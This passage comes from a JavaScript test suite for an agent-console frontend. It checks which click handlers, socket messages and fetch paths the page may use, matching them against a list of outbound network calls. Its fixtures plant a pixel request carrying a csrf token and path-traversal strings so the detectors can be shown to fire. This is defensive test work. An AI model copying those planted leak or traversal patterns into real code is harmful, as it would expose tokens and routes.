  assert.match(shell, /function openView\(next: ControlView\): void \{\s*setFocused\(false\);\s*setView\(next\);\s*if \(CONTROL_VIEWS\.some\(\(entry\) => entry\.view === next && entry\.refresh\)\) refreshFloorSnapshot\(\);\s*\}/);
  assert.deepEqual(clicksIn(await readFile(resolve(floor, SETTINGS_VIEW), 'utf8')), ['onSetup', 'onSetup',
    '() => { void desktopNotificationPreference.setEnabled(!on); }', '() => setOfficePin(id)', 'onCopyAdd']);
  assert.deepEqual(clicksIn(await readFile(resolve(floor, SETUP_VIEW), 'utf8')).sort(), [
    '() => copyToClipboard(install)',
    '() => refreshFloorSnapshot()',
    'onGuide',
  ]);
  assert.deepEqual(clicksIn(await readFile(resolve(floor, FIRST_RUN_GUIDE), 'utf8')), [
    '() => copyToClipboard(text)',
    'onClose',
    '() => onStep(entry.key)',
    '(event) => onHire(event.currentTarget)',
    '() => onStep(steps[at - 1].key)',
    '() => refreshFloorSnapshot()',
    '() => onStep(steps[at + 1].key)',
  ]);
  const work = await readFile(resolve(source, 'renderer/LiveWork.tsx'), 'utf8');
  assert.match(work, /onClick=\{\(\) => selectOutputAgent\(output\.targetId, true\)\}/);
  assert.match(work, /onClick=\{onClear\}/);
  assert.match(work, /onClick=\{\(\) => onToggle\(!open\)\}/);

  // The Hire form's activators, each named: sections, Back, Next, the one
  // Hire, Check again for a missing engine, Check status on the same attempt,
  // Edit after a no-effect refusal, Hire another after a durable answer, and
  // Close. The shell opens it.
  assert.deepEqual(clicksIn(await readFile(resolve(floor, HIRE_FORM), 'utf8')).sort(), [
    '() => { if (at !== 0 && !frozen && !stuck) moveSection(-1, floor); }',
    '() => { if (at !== SECTIONS.length - 1 && !frozen && !stuck) moveSection(1, floor); }',
    '() => { if (!stuck) showSection(entry.key); }',
    '() => refreshFloorSnapshot()',
    '() => { if (!hire.sending && !waiting) void checkHireStatus(browserHireDeps); }',
    '() => { if (blocked === null && !frozen && !hire.sending) void submitHire(floor, browserHireDeps); }',
    'onClose',
    'onClose',
    '() => { if (!hire.sending) releaseAttempt(); }',
    '() => { if (fresh && floor.onboarding !== null) startAnotherHire(); }',
  ].sort());
  assert.deepEqual(clicksIn(await readFile(resolve(floor, HIRE_ENTRY), 'utf8')),
    ['(event) => onAddAgent(event.currentTarget)']);
  assert.deepEqual(clicksIn(await readFile(resolve(source, 'shell.tsx'), 'utf8')), [
    'toggleCrew',
    'toggleFocus',
    '(event) => openHire(event.currentTarget)',
    '() => setPreferences((current) => ({ ...current, theme: toggleTheme(current.theme, osDark) }))',
  ]);
  assert.deepEqual(clicksIn(await readFile(resolve(floor, ANSWER_FORM), 'utf8')).sort(), [
    'dismissReceipt',
    '() => { if (!answer.sending && floor.answering) void checkAnswerStatus(browserAnswerDeps); }',
    '() => void submitAnswer(gate, browserAnswerDeps)',
    'releaseAnswer',
  ].sort());
  assert.deepEqual(clicksIn(await readFile(resolve(floor, CHAT_PANEL), 'utf8')).sort(), [
    '() => void submitChat(gate, browserChatDeps)', 'releaseChat', '() => void retryChat(browserChatDeps)',
    '() => void cancelChat(gate, note, browserChatDeps)', '() => selectOutputAgent(row.id, true)',
    '() => selectChatAnswer(row.id, null)',
    '() => selectChatAnswer(row.id, { questionLsn: question.questionLsn, question: question.question })',
    '() => void startFreshChat(attempt, outcome, browserChatDeps)',
  ].sort());
  assert.deepEqual(clicksIn(await readFile(resolve(floor, CONTROL_PANEL), 'utf8')).sort(), [
    'dismissReceipt',
    '() => { if (!control.sending && floor.control) void checkControlStatus(browserControlDeps); }',
    "(event) => { if (event.detail < 2) void submitControl('pause', gate, browserControlDeps); }",
    "(event) => { if (event.detail < 2) void submitControl('resume', gate, browserControlDeps); }",
  ].sort());
  assert.deepEqual(clicksIn(await readFile(resolve(floor, PAUSE_ALL_PANEL), 'utf8')).sort(), [
    'onOpen', 'onCancel', 'onConfirm', 'onCheck', 'onDismiss',
  ].sort());
  assert.deepEqual(clicksIn(await readFile(resolve(floor, RETIRE_PANEL), 'utf8')).sort(), [
    'dismissReceipt',
    '() => confirmRetire(offer, session)',
    '(event) => { if (event.detail < 2) void submitRetire(offer, browserControlDeps); }',
    'cancelRetire',
    "() => { cancelRetire(); void submitControl('pause', pause, browserControlDeps); }",
    '() => { if (!retire.sending && floor.retire) void checkRetireStatus(browserControlDeps); }',
  ].sort());
  assert.deepEqual(clicksIn(await readFile(resolve(floor, GOAL_PANEL), 'utf8')).sort(), [
    'dismissReceipt',
    '() => { if (!goal.sending && floor.goalChange) void checkGoalStatus(browserGoalDeps); }',
    '() => void submitGoal(gate, browserGoalDeps)',
  ].sort());
  const diff = await readFile(resolve(floor, DIFF_PANEL), 'utf8');
  assert.deepEqual(clicksIn(diff), [
    '() => { onOpen(entry); }', 'onPage', 'refresh', 'refresh',
    "() => { latest.current += 1; inflight.current = null; setState({ owner, phase: 'closed' }); }",
  ]);
  assert.match(diff, /onPage=\{\(\) => \{ if \(review\.page\.next_cursor !== null\) void read\(\{ mode: 'page', manifest_id: review\.page\.manifest_id, cursor: review\.page\.next_cursor \}, review\); \}\}/);
  assert.match(diff, /const refresh = \(\) => \{ void read\(\{ mode: 'manifest', card, expected_seq: expectedSeq \}, null\); \};/);
  assert.match(diff, /void read\(\{ mode: 'content', manifest_id: state\.review\.page\.manifest_id, entries: \[entry\.entry_id\] \},/);
  assert.deepEqual(clicksIn(await readFile(resolve(floor, TERMINAL_PANEL), 'utf8')).sort(), [
    '() => { if (target !== null) { if (claudeTrust) setConfirming(true); else attachTerminal(target, browserTerminalPorts()); } }',
    '(event) => { if (event.detail < 2) onConfirm(); }',
    'onCancel',
    "() => command('copy')",
    "() => command('expand')",
    "() => command('zoom-in')",
    "() => command('zoom-out')",
    "() => command('zoom-reset')",
    'detachTerminal',
    'dismissTerminal',
  ].sort());
  assert.deepEqual(clicksIn(await readFile(resolve(source, 'renderer/DoneNotices.tsx'), 'utf8')), [
    '() => dismissDoneNotice(notice.key)',
  ]);

  const planted = `${canvas}\n${notes}\n<button onClick={() => send('agent.answer')}>Answer</button>`;
  assert.equal([...planted.matchAll(/<button[\s/>]/gi)].length, 8,
    'the button count must fire on a planted answer button');
  assert.equal([...planted.matchAll(/\bonclick\s*=/gi)].length, 8,
    'the click count must fire on a planted answer handler');
});

/** Every `onClick` handler expression in a TSX text. */
function clicksIn(text) {
  const syntax = ts.createSourceFile('view.tsx', text, ts.ScriptTarget.Latest, true, ts.ScriptKind.TSX);
  const clicks = [];
  function collect(node) {
    if (ts.isJsxAttribute(node) && node.name.getText(syntax) === 'onClick') {
      clicks.push(node.initializer.expression.getText(syntax));
    }
    ts.forEachChild(node, collect);
  }
  collect(syntax);
  return clicks;
}

test('the served HTML and CSS match no FORBIDDEN pattern and no static activator', async () => {
  // The source is what this repository writes; the served files are what an
  // operator is handed. Markup and styles are scanned, and the JavaScript
  // bundle deliberately is not: React's own source carries `onClick`,
  // `contenteditable` and other handler names in its property tables, so a
  // string scan over the bundle reports those whatever the application does
  // with them, and a check that cannot come back clean is a check that says
  // nothing. What the bundle actually renders is enumerated in the live DOM
  // instead, by a check that counts the
  // control elements and the forms on the page an operator is looking at.
  const outputs = await filesUnder(built, ['.html', '.css']);
  assert.ok(outputs.length >= 2, 'the build output was not found; run `npm --prefix floor run build`');

  const carrying = [];
  for (const path of outputs) {
    const text = await readFile(path, 'utf8');
    const found = controlsIn(text);
    if (/<button[\s/>]|\bonclick\s*=/i.test(text)) found.push('an unapproved static activator');
    if (found.length > 0) carrying.push(`${path.slice(floor.length + 1)}: ${found.join(', ')}`);
  }
  assert.deepEqual(carrying, [], 'the served markup carries a control the source does not');

  // And the shipped HTML is still the empty shell the application mounts into.
  const html = await readFile(resolve(built, 'index.html'), 'utf8');
  assert.match(html, /<div id="root"><\/div>/);
});

test('the page sends only the four named read-only stream messages', async () => {
  // The output view adds exactly one selected output read filter and its clear to
  // `floor.subscribe` and `floor.unsubscribe`. An unlisted type has no
  // dispatch target — but a page that tried would be a page asking for
  // authority it must not have, whoever refuses it.
  const stream = await readFile(resolve(source, 'renderer/floor/stream.ts'), 'utf8');
  const syntax = ts.createSourceFile('stream.ts', stream, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  assert.deepEqual(syntax.parseDiagnostics, [], 'the stream source no longer parses');
  const sent = [];
  function collect(node) {
    if (ts.isCallExpression(node)
      && ts.isPropertyAccessExpression(node.expression)
      && node.expression.name.text === 'send') {
      sent.push(node.arguments.map((argument) => argument.getText(syntax)).join(', '));
    }
    ts.forEachChild(node, collect);
  }
  collect(syntax);
  assert.deepEqual(sent, ['CLEAR_OUTPUT', "JSON.stringify({ type: 'floor.output.select', agent_id: desired.targetId,\n          ...(desired.view === 'reply' ? { view: 'reply' } : {}) })", 'SUBSCRIBE', 'UNSUBSCRIBE'],
    'the page sent anything beyond the four read-only browser-wire messages');

  const literals = [...stream.matchAll(/const (SUBSCRIBE|UNSUBSCRIBE|CLEAR_OUTPUT) = '([^']+)'/g)];
  assert.equal(literals.length, 3, 'the fixed client messages changed');
  const types = literals.map(([, , text]) => JSON.parse(text).type).sort();
  assert.deepEqual(types, ['floor.output.clear', 'floor.subscribe', 'floor.unsubscribe']);
  assert.match(stream, /live\.send\(JSON\.stringify\(\{ type: 'floor\.output\.select', agent_id: desired\.targetId,\s+\.\.\.\(desired\.view === 'reply' \? \{ view: 'reply' \} : \{\}\) \}\)\)/);

  // Nothing else in the renderer sends anything on a socket, but the terminal
  // channel, whose sends the next test pins.
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    if (path.endsWith('floor/stream.ts') || path.endsWith(TERMINAL_MODULE)) continue;
    const text = await readFile(path, 'utf8');
    assert.doesNotMatch(text, /\.send\(/, `${path.slice(floor.length + 1)} sends on a socket`);
  }
});

/**
 * What the terminal module puts on its socket: each `.send(` call, and the
 * `type` of each object literal handed to its own `send(channel, …)`.
 */
function terminalSendsIn(text) {
  const syntax = parsedByExtension(text, TERMINAL_MODULE);
  const sockets = [];
  const sent = [];
  (function walk(node) {
    if (ts.isCallExpression(node) && ts.isPropertyAccessExpression(node.expression)
      && node.expression.name.text === 'send') {
      sockets.push(node.getText(syntax));
    }
    if (ts.isCallExpression(node) && ts.isIdentifier(node.expression) && node.expression.text === 'send') {
      const message = node.arguments[1];
      const type = message !== undefined && ts.isObjectLiteralExpression(message)
        ? message.properties.find((property) => ts.isPropertyAssignment(property) && spelledName(property.name) === 'type')
        : undefined;
      sent.push(type !== undefined && ts.isStringLiteralLike(type.initializer)
        ? type.initializer.text : `not a literal: ${node.getText(syntax)}`);
    }
    ts.forEachChild(node, walk);
  })(syntax);
  return { sockets, sent: sent.sort() };
}

test("the terminal channel sends only the four terminal-grant client messages, and only the operator's own input is written",
  async () => {
    // The control: a planted fifth message and a second socket send are both seen.
    assert.deepEqual(terminalSendsIn(`
      function send(channel, message) { channel.socket.send(JSON.stringify(message)); }
      send(live, { type: 'terminal.hire', agent }); send(live, message); live.socket.send('{}');
    `), {
      sockets: ['channel.socket.send(JSON.stringify(message))', "live.socket.send('{}')"],
      sent: ['not a literal: send(live, message)', 'terminal.hire'],
    });

    const found = terminalSendsIn(await readFile(resolve(floor, TERMINAL_MODULE), 'utf8'));
    assert.deepEqual(found.sockets, ['channel.socket.send(JSON.stringify(message))'],
      'the terminal module sends on its socket somewhere new');
    assert.deepEqual(found.sent, ['terminal.attach', 'terminal.detach', 'terminal.resize', 'terminal.write'],
      'the terminal channel sends something beyond its four client messages');

    // The one way bytes reach `terminal.write` is the grid's own input event,
    // handed on unchanged: no source calls `writeTerminal` with anything else.
    const writers = [];
    for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
      const relative = path.slice(floor.length + 1);
      const syntax = parsedByExtension(await readFile(path, 'utf8'), relative);
      (function walk(node) {
        if (ts.isCallExpression(node) && ts.isIdentifier(node.expression) && node.expression.text === 'writeTerminal') {
          const around = ts.findAncestor(node.parent, ts.isCallExpression);
          writers.push(`${relative}: ${around?.getText(syntax) ?? node.getText(syntax)}`);
        }
        ts.forEachChild(node, walk);
      })(syntax);
    }
    assert.deepEqual(writers, [`${TERMINAL_PANEL}: term.onData((data) => writeTerminal(data))`],
      'something other than the operator\'s own input is written to the terminal');
  });

/** Five network primitives, matched as text, not only the one the page uses. */
const OUTBOUND = [
  ['fetch', /\bfetch\(/],
  ['XMLHttpRequest', /\bXMLHttpRequest\b/],
  ['sendBeacon', /\bsendBeacon\b/],
  ['EventSource', /\bnew\s+EventSource\b/],
  ['WebSocket', /\bnew\s+WebSocket\b/],
];

const REQUESTS = {
  [CHAT_MODULE]: {
    paths: ['/floor/chat/send', 'application/json', '/floor/chat/cancel', 'application/json'],
    methods: ['POST', 'POST'],
    fetches: ['floorFetch', 'fetch', 'floorFetch', 'deps.fetch', "fetch('/floor/chat/send')", "fetch('/floor/chat/cancel')"],
  },
  [LOOK_MODULE]: {
    paths: ['/floor/look', 'application/json'],
    methods: ['POST'],
    fetches: ['floorFetch', 'fetch', 'floorFetch', "deps.fetch('/floor/look')"],
  },
  [RENAME_MODULE]: {
    paths: ['/floor/rename', 'application/json'],
    methods: ['POST'],
    fetches: ['floorFetch', 'fetch', 'floorFetch', "deps.fetch('/floor/rename')"],
  },
  [ANSWER_MODULE]: {
    paths: ['/floor/answer', 'application/json'],
    methods: ['POST'],
    fetches: ['floorFetch', 'fetch', 'floorFetch', 'deps.fetch', "fetch('/floor/answer')"],
  },
  [CONTROL_MODULE]: {
    paths: ['/floor/pause', '/floor/resume', 'application/json'],
    methods: ['POST'],
    fetches: ['floorFetch', 'fetch', 'floorFetch', 'deps.fetch', 'fetch(ROUTES[attempt.verb])'],
  },
  'src/renderer/control/pauseAll.ts': {
    paths: [],
    methods: [],
    fetches: ['deps.fetch'],
  },
  [GOAL_MODULE]: {
    paths: ['/floor/goal', '/floor/renew', 'application/json'],
    methods: ['POST'],
    fetches: ['floorFetch', 'fetch', 'floorFetch', 'deps.fetch', 'fetch(routeOf(attempt.payload))'],
  },
  [RETIRE_MODULE]: {
    paths: ['/floor/retire', 'application/json'],
    methods: ['POST'],
    fetches: ['deps.fetch', "fetch('/floor/retire')"],
  },
  [TICKET_MODULE]: {
    paths: ['/floor/ticket', '/floor/ticket/edit', '/floor/ticket/assign', '/floor/ticket/accept', '/floor/ticket/stop',
      '/floor/ticket/remove', '/floor/ticket/read', 'application/json'],
    methods: ['POST'],
    fetches: ['fetch(ROUTES[verb])', 'deps.fetch'],
  },
  [GIT_MODULE]: {
    paths: ['/floor/git', 'application/json'],
    methods: ['POST'],
    fetches: ["fetch('/floor/git')", 'deps.fetch'],
  },
  [DIFF_MODULE]: {
    paths: ['/', '/floor/diff', 'application/json'],
    methods: ['POST'],
    fetches: ["fetch('/floor/diff')"],
  },
  'src/renderer/diff/transport.ts': {
    paths: [],
    methods: [],
    fetches: ['floorFetch', 'floorFetch'],
  },
  [MEMORY_MODULE]: {
    paths: ['application/json', '/floor/memory/page', '/floor/memory/entry'],
    methods: ['POST'],
    fetches: ['deps.fetch(path)'],
  },
  'src/renderer/floor/stream.ts': {
    paths: ['template: `${scheme}//${location.host}/floor/stream`'],
    methods: [],
    fetches: ['browserIndexFetch', 'fetchIndex', 'browserIndexFetch'],
  },
  'src/renderer/floor/away.ts': {
    paths: ['/floor/'],
    methods: ['GET'],
    fetches: ["window.fetch('/floor/')", 'ports.fetchIndex()', 'ports.fetchIndex()'],
  },
  'src/transport.ts': {
    paths: [],
    methods: [],
    fetches: ['window.fetch(url)'],
  },
  'src/renderer/onboarding/hire.ts': {
    paths: ['/floor/onboard', 'application/json'],
    methods: ['POST'],
    fetches: ['floorFetch', 'fetch', 'floorFetch', 'deps.fetch', "fetch('/floor/onboard')"],
  },
  [TERMINAL_MODULE]: {
    paths: ['template: `${scheme}//${location.host}/floor/terminal`'],
    methods: [],
    fetches: [],
  },
  'src/session.ts': {
    paths: ['/floor/assets/', '/floor/session', 'text/plain;charset=UTF-8', '/floor/', '/floor/session/recover'],
    methods: ['POST', 'GET', 'POST'],
    fetches: ['floorFetch', 'floorFetch', 'FetchPort', 'fetch', 'floorFetch', 'FetchPort', 'fetch', 'FetchPort', 'fetch',
      'fetch', 'FetchPort', 'fetch', "fetch('/floor/session')", 'FetchPort', "fetch('/floor/')", 'FetchPort', "fetch('/floor/session/recover')"],
  },
};

/** `OUTBOUND`'s fetch pattern, but for a space before the parenthesis too. */
const FETCH_CALL = /\bfetch\s*\(/;

const HTTP_METHOD = /^(?:get|head|post|put|delete|connect|options|trace|patch)$/i;

/** Declarations whose `name` binds a local or a type member, so naming `fetch` there is not a read of it. */
const DECLARES = [ts.isVariableDeclaration, ts.isParameter, ts.isFunctionDeclaration, ts.isFunctionExpression,
  ts.isClassDeclaration, ts.isClassExpression, ts.isInterfaceDeclaration, ts.isTypeAliasDeclaration,
  ts.isEnumDeclaration, ts.isEnumMember, ts.isModuleDeclaration, ts.isMethodSignature, ts.isPropertySignature,
  ts.isTypeParameterDeclaration];

/** The name a key, `.name` access or `['name']` access spells, when it is spelled as a literal. */
function spelledName(node) {
  if (ts.isComputedPropertyName(node)) node = node.expression;
  if (ts.isPropertyAccessExpression(node)) return node.name.text;
  if (ts.isElementAccessExpression(node)) node = node.argumentExpression;
  return ts.isIdentifier(node) || ts.isStringLiteralLike(node) ? node.text : null;
}

/**
 * The name `node` reads, if it is an identifier, a `.name` or `['name']`
 * access, or a string property key, and is not the name a `DECLARES`
 * declaration or a renamed destructuring binds. So a bare reference, a
 * destructuring and an import each read the name they spell.
 */
function nameRead(node) {
  const { parent } = node;
  if (parent !== undefined && ((parent.name === node && DECLARES.some((is) => is(parent)))
    || (ts.isBindingElement(parent) && parent.name === node && parent.propertyName !== undefined))) return null;
  if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) return spelledName(node);
  return ts.isIdentifier(node) || (ts.isStringLiteral(node) && parent !== undefined
    && (parent.name === node || parent.propertyName === node) && !ts.isModuleDeclaration(parent)) ? node.text : null;
}

/**
 * One file's paths, `method` values and `fetch` names, read from its syntax
 * tree with string escapes and line continuations resolved. Type nodes are
 * walked too; only static import and export specifiers and type-only imports
 * are skipped. In a `REQUESTS` file a path is a string literal holding a
 * `/`, or a template with a `/` in its head or a span's text; elsewhere, a string literal or
 * template head starting with `/floor`. A `method` is a `method:` property or
 * a `.method =` or `['method'] =` write; outside a `REQUESTS` file, only one
 * whose value is an HTTP verb or not a string literal. A `fetch` name is a
 * `nameRead` name that contains `fetch` or is `Request`; it is recorded as
 * `callee(first argument)` where it is called. A path in a `+` chain, a
 * template, and a `method` whose value is not a string literal are recorded
 * as their source text, the chain whole with parentheses skipped.
 */
function requestsIn(text, file, pinned) {
  const syntax = parsedByExtension(text, file);
  const isPath = (cooked) => (pinned ? cooked.includes('/') : cooked.startsWith('/floor'));
  const paths = [];
  const joined = new Set();
  const methods = [];
  const fetches = [];
  function recordPath(node, plain) {
    let top = node;
    let chained = false;
    for (let at = node.parent; ts.isParenthesizedExpression(at) || (ts.isBinaryExpression(at)
      && [ts.SyntaxKind.PlusToken, ts.SyntaxKind.PlusEqualsToken].includes(at.operatorToken.kind)); at = at.parent) {
      top = at;
      if (ts.isBinaryExpression(at)) chained = true;
    }
    if (!chained) paths.push(plain);
    else if (!joined.has(top)) {
      joined.add(top);
      paths.push(`joined: ${top.getText(syntax)}`);
    }
  }
  (function walk(node) {
    if ((ts.isImportClause(node) || ts.isImportSpecifier(node)) && node.isTypeOnly) return;
    const { parent } = node;
    if ((ts.isStringLiteral(node) || ts.isNoSubstitutionTemplateLiteral(node)) && isPath(node.text)
      && !ts.isImportDeclaration(parent) && !ts.isExportDeclaration(parent)) {
      recordPath(node, node.text);
    }
    if (ts.isTemplateExpression(node) && (pinned
      ? [node.head, ...node.templateSpans.map(({ literal }) => literal)].some(({ text }) => text.includes('/'))
      : isPath(node.head.text))) {
      recordPath(node, `template: ${node.getText(syntax)}`);
    }
    let method;
    if ((ts.isPropertyAssignment(node) || ts.isShorthandPropertyAssignment(node)) && spelledName(node.name) === 'method') {
      method = ts.isPropertyAssignment(node) ? node.initializer : null;
    } else if (ts.isBinaryExpression(node) && node.operatorToken.kind >= ts.SyntaxKind.FirstAssignment
      && node.operatorToken.kind <= ts.SyntaxKind.LastAssignment
      && (ts.isPropertyAccessExpression(node.left) || ts.isElementAccessExpression(node.left))
      && spelledName(node.left) === 'method') {
      method = node.right;
    }
    if (method !== undefined) {
      const literal = method !== null && ts.isStringLiteralLike(method);
      if (pinned || !literal || HTTP_METHOD.test(method.text)) {
        methods.push(literal ? method.text : `not a literal: ${node.getText(syntax)}`);
      }
    }
    const name = nameRead(node);
    if (name !== null && (/fetch/i.test(name) || name === 'Request')) {
      const called = (ts.isCallExpression(parent) || ts.isNewExpression(parent)) && parent.expression === node;
      fetches.push(called
        ? `${ts.isNewExpression(parent) ? 'new ' : ''}${node.getText(syntax)}(${parent.arguments?.[0]?.getText(syntax) ?? ''})`
        : node.getText(syntax));
      return;
    }
    ts.forEachChild(node, walk);
  })(syntax);
  return { paths, methods, fetches };
}

test('fetch and new WebSocket match in fifteen known files, and requestsIn yields the REQUESTS pins', async () => {
  // `session.ts` calls `fetch`, and should: exchanging the operator's bootstrap
  // for a session is its whole job, and `stream.ts` opens the one socket.
  // The Hire sends one POST to one path, and so do the answer and Retire;
  // pause and resume send one POST to one of their two paths. What matters
  // for this test is that those are the only ways out, that each fetch goes to
  // its own path, and that no other has appeared to carry an answer somewhere.
  // Searching for `fetch(` alone would miss an XHR, a beacon, an EventSource or
  // a second socket, so the five primitive patterns are each counted.
  const reaching = new Map();
  const calling = [];
  for (const path of await filesUnder(source, ['.ts', '.tsx'])) {
    const text = await readFile(path, 'utf8');
    for (const [name, pattern] of OUTBOUND) {
      if (pattern.test(text)) reaching.set(name, [...(reaching.get(name) ?? []), path.slice(floor.length + 1)]);
    }
    if (FETCH_CALL.test(text)) calling.push(path.slice(floor.length + 1));
  }
  assert.deepEqual(
    Object.fromEntries([...reaching].sort().map(([name, files]) => [name, [...files].sort()])),
    {
      WebSocket: ['src/renderer/floor/stream.ts'],
      fetch: [ANSWER_MODULE, CHAT_MODULE, CONTROL_MODULE, DIFF_MODULE, 'src/renderer/floor/away.ts', GIT_MODULE, GOAL_MODULE, LOOK_MODULE, MEMORY_MODULE, 'src/renderer/onboarding/hire.ts', RENAME_MODULE, RETIRE_MODULE,
        TICKET_MODULE, 'src/session.ts', 'src/transport.ts'],
    },
    'the page reaches the network somewhere new',
  );

  // The control: the same five patterns, over text with one use of each.
  const fixture = `
    fetch('/x'); new XMLHttpRequest(); navigator.sendBeacon('/y');
    new EventSource('/z'); new WebSocket('ws://a');
  `;
  assert.deepEqual(
    OUTBOUND.filter(([, pattern]) => pattern.test(fixture)).map(([name]) => name).sort(),
    OUTBOUND.map(([name]) => name).sort(),
    'a pattern in OUTBOUND no longer matches the primitive it names',
  );
  assert.match('fetch ("/a")', FETCH_CALL);
  // The reader's control, in a file `REQUESTS` does not name. Read as
  // themselves: a line continuation, a concatenation, a template, a variable,
  // a Request, a comment before the parenthesis, an escaped quote, a
  // multi-line template, an alias, `fetch?.()`, `(fetch)()`, `['fetch']()`,
  // two destructurings, an import, a parenthesized join, an instantiation
  // expression, a class heritage clause, a destructuring assignment, a
  // string-keyed destructuring, two `method` writes and a type name. Not read:
  // a message, a relative module path, a non-HTTP `method` value.
  const loose = requestsIn([
    "fetch('/floor/pix\\",
    "el?c=' + csrf);",
    'fetch("/floor/answer" + \'/../../floor/onboard\');',
    'fetch(`/floor/stream/${id}`);',
    "const pixel = '/floor/pixel'; void new Request(pixel, { method: verb });",
    "fetch/**/('/floor/answer\\'/../../floor/onboard', { 'method': 'GET' });",
    'fetch(`/floor/pixel',
    '?c=1`);',
    "const go = window.fetch; go('/x', { method });",
    "fetch?.('/x'); (fetch)('/x'); window['fetch']('/x');",
    "const { fetch: run } = window; const { fetch } = globalThis; import { fetch as get } from './net.ts';",
    "const t = (('/floor/answer')) + tail; void new Error('open the page under /floor/ first');",
    "void import('../floor/store.ts'); void new URL('../floor/x.png', import.meta.url); void { method: 'nearest' };",
    "void (fetch('/floor/x'), Array)<number>; class C extends (fetch('/floor/y'), Object) {}",
    "({ fetch: move } = window); const { 'fetch': call } = window; init.method = 'PUT'; init['method'] = verb;",
    'let port: FetchPort;',
  ].join('\n'), 'fixture.ts', false);
  assert.deepEqual(loose, {
    paths: [
      "joined: '/floor/pix\\\nel?c=' + csrf",
      "joined: \"/floor/answer\" + '/../../floor/onboard'",
      'template: `/floor/stream/${id}`',
      '/floor/pixel',
      "/floor/answer'/../../floor/onboard",
      '/floor/pixel\n?c=1',
      "joined: (('/floor/answer')) + tail",
      '/floor/x',
      '/floor/y',
    ],
    methods: ['not a literal: method: verb', 'GET', 'not a literal: method', 'PUT', "not a literal: init['method'] = verb"],
    fetches: [
      "fetch('/floor/pix\\\nel?c=' + csrf)",
      "fetch(\"/floor/answer\" + '/../../floor/onboard')",
      'fetch(`/floor/stream/${id}`)',
      'new Request(pixel)',
      "fetch('/floor/answer\\'/../../floor/onboard')",
      'fetch(`/floor/pixel\n?c=1`)',
      'window.fetch',
      "fetch('/x')",
      'fetch',
      "window['fetch']('/x')",
      'fetch',
      'fetch',
      'fetch',
      "fetch('/floor/x')",
      "fetch('/floor/y')",
      'fetch',
      "'fetch'",
      'FetchPort',
    ],
  });
  // In a file `REQUESTS` names, a string literal holding a `/` is read, a
  // string-literal type included, and a pinned template joined to more is
  // recorded as its whole chain.
  assert.deepEqual(requestsIn([
    "const ROUTES = { pause: '/fl' + 'oor/answer', resume: '/api/resume', back: '../floor/onboard' };",
    'const url = `${scheme}//${host}/floor/stream` + "?c=" + secret;',
    "void { method: 'nearest' };",
    "void (fetch('/floor/x'), Array)<number>; class C extends (fetch('/floor/y'), Object) {}",
    "type Route = '/api/pause';",
  ].join('\n'), 'fixture.ts', true), {
    paths: [
      "joined: '/fl' + 'oor/answer'",
      '/api/resume',
      '../floor/onboard',
      'joined: `${scheme}//${host}/floor/stream` + "?c=" + secret',
      '/floor/x',
      '/floor/y',
      '/api/pause',
    ],
    methods: ['nearest'],
    fetches: ["fetch('/floor/x')", "fetch('/floor/y')"],
  });

  const fetching = reaching.get('fetch') ?? [];
  assert.deepEqual(fetching.sort(),
    [ANSWER_MODULE, CHAT_MODULE, CONTROL_MODULE, DIFF_MODULE, 'src/renderer/floor/away.ts', GIT_MODULE, GOAL_MODULE, LOOK_MODULE, MEMORY_MODULE, 'src/renderer/onboarding/hire.ts', RENAME_MODULE, RETIRE_MODULE, TICKET_MODULE, 'src/session.ts', 'src/transport.ts'],
    'something other than the session exchange, the Hire, the answer, pause or resume, goal change, Retire, the Git read, the changes read, the memory reads, the away watch and the transport fetches');
  assert.deepEqual(calling.sort(), fetching,
    'a module other than those six calls fetch with a space before the parenthesis');

  // Pause and resume: one POST, whose path is one of exactly two, each written once.
  const controlText = await readFile(resolve(floor, CONTROL_MODULE), 'utf8');
  assert.deepEqual([...controlText.matchAll(/^.*\bfetch\(.*$/gm)].map((match) => match[0].trim()), [
    'fetch(url: string, init: RequestInit): Promise<ControlResponse>;',
    'const response = await fetch(ROUTES[attempt.verb], {',
  ], 'the control module calls fetch somewhere new');
  assert.deepEqual([...controlText.matchAll(/^.*\bfetch\s*\(.*$/gm)].map((match) => match[0].trim()), [
    'fetch(url: string, init: RequestInit): Promise<ControlResponse>;',
    'const response = await fetch(ROUTES[attempt.verb], {',
  ], 'the control module calls fetch somewhere new');
  assert.match(controlText, /const ROUTES = Object\.freeze\(\{ pause: '\/floor\/pause', resume: '\/floor\/resume' \}\);/);
  assert.deepEqual([...controlText.matchAll(/'(\/[^']*)'/g)].map((match) => match[1]), ['/floor/pause', '/floor/resume'],
    'the control module names a path beyond its two routes');
  assert.deepEqual([...controlText.matchAll(/method:\s*'([A-Z]+)'/g)].map((match) => match[1]), ['POST'],
    'pause and resume use a method other than POST');

  const answer = await readFile(resolve(floor, ANSWER_MODULE), 'utf8');
  assert.deepEqual([...answer.matchAll(/fetch\(\s*'([^']+)'/g)].map((match) => match[1]), ['/floor/answer'],
    'the answer calls somewhere else too');
  assert.deepEqual([...answer.matchAll(/method:\s*'([A-Z]+)'/g)].map((match) => match[1]), ['POST'],
    'the answer uses a method other than POST');

  const retireText = await readFile(resolve(floor, RETIRE_MODULE), 'utf8');
  assert.deepEqual([...retireText.matchAll(/^.*\bfetch\s*\(.*$/gm)].map((match) => match[0].trim()), [
    "const response = await fetch('/floor/retire', {",
  ], 'Retire calls fetch somewhere new');
  assert.deepEqual([...retireText.matchAll(/'(\/[^']*)'/g)].map((match) => match[1]), ['/floor/retire'],
    'Retire names a path beyond its one route');
  assert.deepEqual([...retireText.matchAll(/method:\s*'([A-Z]+)'/g)].map((match) => match[1]), ['POST'],
    'Retire uses a method other than POST');

  const goalText = await readFile(resolve(floor, GOAL_MODULE), 'utf8');
  assert.deepEqual([...goalText.matchAll(/^.*\bawait fetch\(.*$/gm)].map((match) => match[0].trim()),
    ['const response = await fetch(routeOf(attempt.payload), {'], 'goal change calls fetch somewhere new');
  assert.deepEqual([...goalText.matchAll(/'(\/floor\/[^']*)'/g)].map((match) => match[1]), ['/floor/goal', '/floor/renew'],
    'goal change and renewal name a path beyond their two routes');
  assert.deepEqual([...goalText.matchAll(/method:\s*'([A-Z]+)'/g)].map((match) => match[1]), ['POST'],
    'goal change uses a method other than POST');

  const hire = await readFile(resolve(source, 'renderer/onboarding/hire.ts'), 'utf8');
  assert.deepEqual([...hire.matchAll(/fetch\(\s*'([^']+)'/g)].map((match) => match[1]), ['/floor/onboard'],
    'the Hire calls somewhere else too');
